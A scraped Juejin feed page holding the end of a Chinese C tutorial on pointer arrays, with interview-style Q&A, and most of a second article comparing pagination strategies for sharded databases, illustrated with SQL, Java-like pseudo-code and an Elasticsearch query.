    <span class="hljs-keyword">if</span> (array_of_pointers == <span class="hljs-literal">NULL</span>) {  
        <span class="hljs-comment">// 处理内存分配失败的情况  </span>
        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Memory allocation failed\n"</span>);  
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;  
    }  
  
    <span class="hljs-comment">// 为每个指针分配内存并初始化  </span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) {  
        array_of_pointers[i] = (<span class="hljs-type">int</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));  
        <span class="hljs-keyword">if</span> (array_of_pointers[i] == <span class="hljs-literal">NULL</span>) {  
            <span class="hljs-comment">// 处理内存分配失败的情况，并释放之前分配的内存  </span>
            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Memory allocation failed at index %d\n"</span>, i);  
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; i; j++) {  
                <span class="hljs-built_in">free</span>(array_of_pointers[j]);  
            }  
            <span class="hljs-built_in">free</span>(array_of_pointers);  
            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;  
        }  
        array_of_pointers[i][<span class="hljs-number">0</span>] = i * <span class="hljs-number">10</span>; <span class="hljs-comment">// 初始化每个整型值为i*10  </span>
    }  
  
    <span class="hljs-comment">// 打印每个整型值  </span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) {  
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"array_of_pointers[%d] = %d\n"</span>, i, array_of_pointers[i][<span class="hljs-number">0</span>]);  
    }  
  
    <span class="hljs-comment">// 释放内存  </span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) {  
        <span class="hljs-built_in">free</span>(array_of_pointers[i]);  
    }  
    <span class="hljs-built_in">free</span>(array_of_pointers);  
  
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  
}
</code></pre>
<p>首先动态分配了一个整型指针数组<code>array_of_pointers</code>，然后为每个指针分配了内存，并初始化了它们指向的整型值。最后，我们打印了每个整型值，并释放了所有分配的内存。</p>
<p><strong>运行结果：</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/57c779175e274f4bb627973a31f5e147~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYnl0Zei9u-mqkeWFtQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770858627&amp;x-signature=yQcAjmc0np20UEA%2FX2ot0zL8P9U%3D" alt="" loading="lazy"/></p>
<p>需要注意的是，在使用<code>malloc</code>分配内存后，应该始终检查返回值是否为<code>NULL</code>，以确保内存分配成功。此外，在释放内存时，我们应该按照与分配相反的顺序来释放，以避免内存泄漏。</p>
<h2 data-id="heading-28">六、测试</h2>
<blockquote>
<p><strong>问题</strong>：C语言指针算术运算的核心特性是什么？使用时需遵守哪些规则？<strong>（某互联网公司2024校招）</strong></p>
</blockquote>
<p><strong>答案</strong>：</p>
<p>核心特性是按指针指向的数据类型大小偏移（如int指针+1偏移4字节）；</p>
<p>规则：仅对同类型指针有效，禁止访问非法内存地址。</p>
<blockquote>
<p><strong>问题</strong>：函数指针的定义格式是什么？回调函数的实现本质是什么？<strong>（某硬件公司2023社招）</strong></p>
</blockquote>
<p><strong>答案</strong>：</p>
<p>定义格式：<code>返回值类型 (*指针名)(参数类型列表)</code>（如<code>int (*func_ptr)(int, int)</code>）；</p>
<p>实现本质：将函数地址作为参数传递，在目标函数内动态调用。</p>
<blockquote>
<p><strong>问题</strong>：二级指针在动态内存分配中主要用于什么场景？释放内存的顺序是什么？</p>
</blockquote>
<p><strong>答案</strong>：</p>
<p>场景：动态创建指针数组（如<code>int**</code>指向多个<code>int*</code>）；</p>
<p>释放顺序：先释放每个子指针指向的内存，最后释放二级指针本身。</p>
<blockquote>
<p><strong>问题</strong>：指针加1的实际地址增量由什么决定？（2023腾讯C语言开发岗真题）</p>
</blockquote>
<p>**答案：**由指针指向的数据类型大小决定（即<code>sizeof(类型)</code>）。如<code>int*</code>加1增4字节（<code>sizeof(int)=4</code>）。</p>
<blockquote>
<p><strong><code>问题：</code></strong><code>malloc</code>分配的内存未初始化，如何清零？（2022阿里后端开发真题）</p>
</blockquote>
<p><strong>答案：</strong></p>
<p>用<code>calloc</code>（自动清零）或<code>memset(ptr, 0, size)</code>，或手动赋值。</p>
<blockquote>
<p><strong>问题</strong>：函数指针的定义及调用方式？（2021百度C++岗模拟题）</p>
</blockquote>
<p><strong>答案：</strong></p>
<p>定义如<code>int (*fp)(int,int);</code>；赋值<code>fp=func</code>；调用用<code>fp(a,b)</code>或<code>(*fp)(a,b)</code>。</p>
<blockquote>
<p><strong>题目</strong>：C语言中，函数指针和回调函数有什么应用？请举例说明。</p>
</blockquote>
<p><strong>答案</strong>：</p>
<p>函数指针用于实现回调机制，允许函数作为参数传递，常见于事件处理、异步编程和算法抽象（如<code>qsort</code>的比较函数）。例如，图形库中可传入一个用户自定义的绘图函数指针，由系统在特定事件时调用。</p>
<blockquote>
<p><strong>题目</strong>：如何使用二级指针（<code>int **p</code>）动态分配一个二维数组？并说明在释放内存时应注意什么。</p>
</blockquote>
<p><strong>答案</strong>：</p>
<p>首先为“行指针数组”分配内存：<code>int **p = (int**)malloc(row * sizeof(int*))</code>；然后为每一行分配内存：<code>for(i=0; i&lt;row; i++) p[i] = (int*)malloc(col * sizeof(int))</code>。释放时顺序相反：先循环释放每一行<code>free(p[i])</code>，再释放行指针数组<code>free(p)</code>，以防止内存泄漏。</p>
<blockquote>
<p><strong>题目</strong>：解释以下代码中<code>ptr++</code>和<code>(*ptr)++</code>的区别。<code>int arr[] = {1,2,3}; int *ptr = arr;</code></p>
</blockquote>
<p><strong>答案</strong>：</p>
<p><code>ptr++</code>是指针算术运算，使指针<code>ptr</code>向后移动一个<code>int</code>类型大小的内存单元，指向数组的下一个元素<code>arr[1]</code>。<code>(*ptr)++</code>是解引用后对所指数据进行自增，即将<code>arr[0]</code>的值从1增加为2，但<code>ptr</code>本身指向的地址不变。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[分库分表下的分页查询，到底该怎么搞？（实战完整版）]]></title>    <link>https://juejin.cn/post/7602841282802876457</link>    <guid>https://juejin.cn/post/7602841282802876457</guid>    <pubDate>2026-02-05T01:09:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602841282802876457" data-draft-id="7602807243705401407" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="分库分表下的分页查询，到底该怎么搞？（实战完整版）"/> <meta itemprop="keywords" content="数据库"/> <meta itemprop="datePublished" content="2026-02-05T01:09:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="what丶k"/> <meta itemprop="url" content="https://juejin.cn/user/2578801884147418"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            分库分表下的分页查询，到底该怎么搞？（实战完整版）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2578801884147418/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    what丶k
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T01:09:53.000Z" title="Thu Feb 05 2026 01:09:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读17分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在后端开发中，分库分表是解决单库单表数据量爆炸、并发瓶颈的必经之路。但随之而来的，是一系列“简单功能变复杂”的坑——分页查询就是最典型的一个。</p>
<p>单库单表时代，我们用 <code>LIMIT offset, size</code> 就能轻松实现分页，比如查询第11页（每页10条），一句 <code>SELECT * FROM t_order ORDER BY create_time DESC LIMIT 100, 10</code> 就能搞定，数据库引擎能通过索引快速定位全局有序数据，性能稳定。</p>
<p>可当数据被拆分到多个库、多个表后，这句简单的SQL就彻底“失灵”了：要么查出来的数据重复、缺失，要么深度分页时性能雪崩，甚至出现排序错乱。很多开发者卡在这里反复调试，却始终找不到优雅的解决方案。</p>
<p>今天，我们就彻底把这个问题讲透——从问题根源出发，拆解4种主流实战方案，分析各自的优缺点与适用场景，再总结避坑技巧，帮你在实际业务中快速选型、落地。</p>
<h2 data-id="heading-0">一、先搞懂：分库分表后，分页查询为什么会“乱”？</h2>
<p>分页查询变难的核心根源，不是“数据多”，而是<strong>分布式环境下的全局有序性缺失</strong>——单库单表中，数据库维护着全局有序索引（比如 <code>create_time</code> 上的B+树），<code>offset</code> 和 <code>size</code>是基于全局数据的截取；但分库分表后，每个分片都是独立的数据库实例，仅维护本地数据的有序性，缺乏“全局有序视图”。</p>
<p>具体来说，会遇到3个核心问题，每一个都能直接影响业务体验：</p>
<h3 data-id="heading-1">1. 深度分页性能暴跌（最常见痛点）</h3>
<p>当 <code>offset</code> 过大时（比如 <code>LIMIT 100000, 10</code>），查询耗时会呈指数级增长。举个例子：假设 <code>t_order</code> 按用户ID哈希分为10个分片（t_order_0至t_order_9），如果沿用单库分页逻辑，会发生两件事：</p>
<ol>
<li>应用会向10个分片各发送 <code>SELECT * FROM t_order_x ORDER BY create_time DESC LIMIT 100010</code>（要取到全局第100001-100010条，每个分片都要查前100010条）；</li>
<li>收集10个分片返回的100100条数据，在应用层排序后，再截取前10条作为结果。</li>
</ol>
<p>这就意味着，原本只需扫描1010条数据的操作，变成了扫描100万+条数据，大量冗余数据的传输和内存排序，直接拖垮应用性能，甚至导致查询超时。某电商案例显示，<code>LIMIT 10000000, 10</code> 的执行时间是 <code>LIMIT 10, 10</code> 的200倍以上。</p>
<h3 data-id="heading-2">2. 分页结果不准确（数据重复/缺失）</h3>
<p>很多时候，分页查出来的数据要么重复出现，要么莫名缺失，核心原因有两个：</p>
<ul>
<li>分片规则与排序字段不匹配：比如按用户ID分片，却按创建时间排序，不同分片的时间范围重叠，聚合时很容易漏掉跨分片的连续数据，或重复统计同一批数据；</li>
<li>数据动态变更：查询过程中，某分片插入、删除或更新了数据，会导致前后页数据重叠（比如第1页末尾数据与第2页开头数据重复），或某条数据凭空消失。</li>
</ul>
<h3 data-id="heading-3">3. 多维度排序无法支持</h3>
<p>当业务需要按非分片键多字段排序时（比如“按订单金额降序+支付时间升序”），性能会极差甚至无法实现。因为非分片键字段没有全局索引，必须扫描所有分片的全量数据才能完成排序，相当于“分布式全表扫描”，分片数越多，性能越差。</p>
<h2 data-id="heading-4">二、4种主流实战方案：从“能用”到“优雅”</h2>
<p>分库分表分页没有“银弹”，所有方案都是“trade-off”（取舍）。下面4种方案，覆盖从浅分页到深分页、从简单查询到复杂查询的所有场景，建议结合自身业务选型。</p>
<h3 data-id="heading-5">方案1：全局扫描法（暴力法）—— 最简单，但性能最差</h3>
<p>这是最基础、最通用的方案，本质是“先拉取、再聚合、最后截取”，完全沿用单库分页逻辑，仅在应用层增加聚合排序步骤。</p>
<h4 data-id="heading-6">实现思路</h4>
<ol>
<li>SQL改写：将分页SQL发送到所有分片，注意<strong>每个分片都要查询“offset+size”条数据</strong>（避免遗漏全局数据）；</li>
<li>并行查询：通过线程池并行调用所有分片，减少等待时间；</li>
<li>全局聚合：收集所有分片的返回结果，在应用层按排序字段做全局排序；</li>
<li>精准截取：从排序后的全局列表中，截取 <code>offset</code> 到 <code>offset+size</code> 的数据，作为最终分页结果。</li>
</ol>
<h4 data-id="heading-7">伪代码示例</h4>
<pre><code class="hljs language-ini" lang="ini">// 1. 构建分片SQL（每个分片都查offset+size条）
String <span class="hljs-attr">sql</span> = <span class="hljs-string">"SELECT * FROM t_order_{0} ORDER BY create_time DESC LIMIT "</span> + (<span class="hljs-literal">off</span>set + size)<span class="hljs-comment">;</span>
// 2. 并行查询所有分片
List&lt;List&lt;Order&gt;&gt; <span class="hljs-attr">allShardData</span> = shardExecutor.parallelExecute(sql)<span class="hljs-comment">;</span>
// 3. 全局聚合排序
List&lt;Order&gt; <span class="hljs-attr">globalData</span> = allShardData.stream()
    .flatMap(Collection::stream)
    .sorted(Comparator.comparing(Order::getCreateTime).reversed())
    .collect(Collectors.toList())<span class="hljs-comment">;</span>
// 4. 截取目标页数据
int <span class="hljs-attr">start</span> = <span class="hljs-literal">off</span>set<span class="hljs-comment">;</span>
int <span class="hljs-attr">end</span> = Math.min(<span class="hljs-literal">off</span>set + size, globalData.size())<span class="hljs-comment">;</span>
List&lt;Order&gt; <span class="hljs-attr">pageData</span> = globalData.subList(start, end)<span class="hljs-comment">;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-8">优缺点与适用场景</h4>
<ul>
<li>优点：开发成本极低，无需修改分片规则，对业务透明，支持任意跳页和多维度排序；</li>
<li>缺点：深度分页性能雪崩，冗余数据传输量大，内存排序压力大，分片数越多性能越差；</li>
<li>适用场景：分片数量少（&lt;4）、分页不深（offset&lt;1000）、查询频率低的场景（比如后台管理系统的低频分页查询）。</li>
</ul>
<h3 data-id="heading-9">方案2：全局唯一键二次查询法—— 浅分页首选，性能优化明显</h3>
<p>方案1的核心问题是“传输全量数据”，而方案2通过“先查主键、再查详情”的方式，大幅减少数据传输量，是浅分页（offset&lt;1万）场景的首选方案。</p>
<h4 data-id="heading-10">核心思路</h4>
<p>利用全局唯一有序键（比如雪花ID、<code>create_time+order_id</code>），将分页查询拆分为两次：第一次仅查询主键和排序字段（数据量极小），聚合排序后确定目标页的主键列表；第二次根据主键列表，路由到对应分片查询完整数据，避免传输冗余字段。</p>
<h4 data-id="heading-11">实现步骤</h4>
<ol>
<li>第一次查询（拉取主键）：向各分片发送仅查询排序字段和主键的SQL，减少数据传输量； <code> -- 分片t_order_0的查询（仅查主键和排序字段）  ``SELECT order_id, create_time FROM t_order_0 ORDER BY create_time DESC LIMIT 10010;</code></li>
<li>全局聚合排序：收集所有分片的（order_id, create_time）数据，在应用层按 <code>create_time</code> 排序，截取第10000-10010条的 <code>order_id</code> 列表（如 (100001, 100002, …, 100010)）；</li>
<li>第二次查询（拉取详情）：根据 <code>order_id</code> 的分片规则（比如哈希路由），路由到对应分片，查询完整数据并排序；<code> -- 路由到order_id对应的分片，查询完整数据  ``SELECT * FROM t_order_0 WHERE order_id IN (100001, 100002, ..., 100010) ORDER BY create_time DESC;</code></li>
</ol>
<h4 data-id="heading-12">优缺点与适用场景</h4>
<ul>
<li>优点：相比方案1，数据传输量减少80%以上（主键仅8-16字节，完整行可能数百字节），浅分页性能提升明显，支持跳页；</li>
<li>缺点：offset过大时（如10万），第一次查询仍需拉取大量主键，性能依然衰减；依赖全局唯一有序键，需额外维护；</li>
<li>适用场景：浅分页（offset&lt;1万）、需要跳页、对性能有一定要求的场景（比如后台管理系统的常规分页查询）。</li>
</ul>
<h3 data-id="heading-13">方案3：游标分页法（无偏移量）—— 深分页首选，性能恒定</h3>
<p>无论是方案1还是方案2，都无法解决“offset过大导致的性能雪崩”。而游标分页法放弃了 <code>offset</code>，改用“上一页最后一条数据的游标位置”作为查询条件，实现“无偏移量”分页，性能与页码无关，是深分页场景的最优解。</p>
<h4 data-id="heading-14">核心思路</h4>
<p>类比我们读书：传统offset分页是“翻到第100页”，而游标分页是“从第99页最后一行继续读”。每次查询时，用上次分页返回的“最后一条数据的排序字段值”（游标）作为过滤条件，仅查询游标之后的数据，无需扫描前面的冗余数据。</p>
<h4 data-id="heading-15">实现步骤（以订单表为例）</h4>
<ol>
<li>
<p>查询第一页：无需游标，直接查询前10条数据，记录最后一条数据的游标</p>
<pre><code class="hljs language-sql" lang="sql">（比如 create_time<span class="hljs-operator">=</span><span class="hljs-number">2026</span><span class="hljs-number">-02</span><span class="hljs-number">-05</span> <span class="hljs-number">10</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>，order_id<span class="hljs-operator">=</span><span class="hljs-number">100010</span>）；
       <span class="hljs-comment">-- 第一页：按创建时间倒序，取10条</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> t_order <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> create_time <span class="hljs-keyword">DESC</span>, order_id <span class="hljs-keyword">DESC</span> LIMIT <span class="hljs-number">10</span>;
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
</li>
<li>
<p>查询下一页：用游标作为过滤条件，查询游标之后的数据，同样取10条，更新游标；<code>-- 下一页：用上次的游标过滤，避免offset</code></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> t_order 
<span class="hljs-keyword">WHERE</span> create_time <span class="hljs-operator">&lt;</span> <span class="hljs-string">'2026-02-05 10:00:00'</span> 
<span class="hljs-keyword">OR</span> (create_time <span class="hljs-operator">=</span> <span class="hljs-string">'2026-02-05 10:00:00'</span> <span class="hljs-keyword">AND</span> order_id <span class="hljs-operator">&lt;</span> <span class="hljs-number">100010</span>)
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> create_time <span class="hljs-keyword">DESC</span>, order_id <span class="hljs-keyword">DESC</span> LIMIT <span class="hljs-number">10</span>;
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
</li>
<li>
<p>分库分表适配：将上述SQL发送到所有分片，各分片仅查询符合游标条件的10条数据，应用层聚合排序后，再取前10条（避免跨分片数据遗漏）。</p>
</li>
</ol>
<h4 data-id="heading-16">关键优化：多字段排序的游标构建</h4>
<p>如果排序字段不唯一（比如 <code>create_time</code> 可能重复），仅用单个字段作为游标会导致数据缺失。此时需要用“排序字段组合”作为游标（如 <code>create_time+order_id</code>），确保游标唯一，避免遗漏数据。</p>
<h4 data-id="heading-17">性能对比（1000万条数据测试）</h4>



































<table><thead><tr><th>页码</th><th>Offset分页耗时</th><th>游标分页耗时</th><th>性能提升</th></tr></thead><tbody><tr><td>第1页</td><td>5ms</td><td>5ms</td><td>-</td></tr><tr><td>第100页</td><td>150ms</td><td>6ms</td><td>25倍</td></tr><tr><td>第1000页</td><td>1.2s</td><td>6ms</td><td>200倍</td></tr><tr><td>第10000页</td><td>8.5s</td><td>7ms</td><td>1200倍</td></tr></tbody></table>
<h4 data-id="heading-18">优缺点与适用场景</h4>
<ul>
<li>优点：性能恒定，与页码无关，深分页场景优势极大；无需扫描冗余数据，内存压力小；支持大数据量连续浏览；</li>
<li>缺点：不支持跳页（无法直接跳到第100页），无法计算总页数；对数据一致性要求高，数据动态变更可能导致重复/缺失；</li>
<li>适用场景：深分页（offset&gt;1万）、连续浏览场景（比如订单流水、日志流水、Feed流、商品列表滚动加载）。</li>
</ul>
<h3 data-id="heading-19">方案4：搜索引擎辅助法—— 复杂查询、多维度排序首选</h3>
<p>如果业务需要“多条件筛选+多维度排序+深度分页”（比如电商的商品搜索分页、用户行为日志查询），前面3种方案都无法满足性能要求。此时最优雅的方式，是采用“查询与存储分离”的架构，用搜索引擎（Elasticsearch/OpenSearch）承担分页查询压力。</p>
<h4 data-id="heading-20">核心架构</h4>
<p>数据的CRUD操作在MySQL分库分表中完成，分页查询、多条件筛选、排序操作在搜索引擎中完成，通过binlog同步数据，实现“存储强一致、查询高性能”。</p>
<ol>
<li>存储层：MySQL分库分表，负责数据的写入、更新、删除，保证数据强一致性；</li>
<li>同步层：通过Canal、Debezium等工具，监听MySQL的binlog，将数据增量同步到搜索引擎（ES），确保数据一致性（延迟可控制在100ms内）；</li>
<li>查询层：应用的分页查询、多条件筛选请求，直接发送到ES，利用ES的分布式索引优势，高效完成排序和分页；MySQL仅承担详情查询、写入等操作。</li>
</ol>
<h4 data-id="heading-21">实现示例（ES分页查询）</h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"query"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"bool"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"must"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
        <span class="hljs-punctuation">{</span><span class="hljs-attr">"term"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"user_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">123</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
        <span class="hljs-punctuation">{</span><span class="hljs-attr">"range"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"create_time"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"gte"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2026-01-01"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">]</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"sort"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span><span class="hljs-attr">"create_time"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"desc"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"order_id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"desc"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"from"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">100000</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// 深分页无压力</span>
  <span class="hljs-attr">"size"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">20</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-22">优缺点与适用场景</h4>
<ul>
<li>优点：功能最强，天然支持多条件检索、多维度排序、深度分页，性能优异；无需修改分库分表架构，对业务侵入性低；</li>
<li>缺点：架构复杂度提升，需维护ES集群和数据同步链路；需处理同步延迟（可通过“关键数据查主库”兜底）；ES深度分页需额外优化（如用search_after替代from/size）；</li>
<li>适用场景：多条件筛选+多维度排序+深度分页的场景（比如电商商品搜索、用户行为分析、日志查询系统）。</li>
</ul>
<h2 data-id="heading-23">三、进阶优化：预计算锚点法（非实时场景补充）</h2>
<p>对于非实时场景（比如报表系统、历史数据查询），还可以采用“预计算分页锚点”的方式，进一步优化性能，减少无效扫描。</p>
<h4 data-id="heading-24">核心思路</h4>
<p>通过定时任务，预计算各分片的“分页锚点”（比如每1000条记录的排序字段值），存储在Redis等元数据服务中。查询时，先通过锚点定位目标数据所在的分片及范围，减少各分片的扫描量。</p>
<h4 data-id="heading-25">实现步骤</h4>
<ol>
<li>锚点计算：每日凌晨对各分片执行 <code>SELECT id, create_time FROM orders ORDER BY create_time LIMIT 0, 1000, 2000...</code>，记录每1000条的 <code>create_time</code> 作为锚点，存入Redis；</li>
<li>查询路由：用户查询第100万页（offset=999990）时，元数据服务计算锚点范围（999990≈1000×999.99），获取各分片第999个锚点的 <code>create_time</code> 值，确定全局最小 <code>time_min</code>；</li>
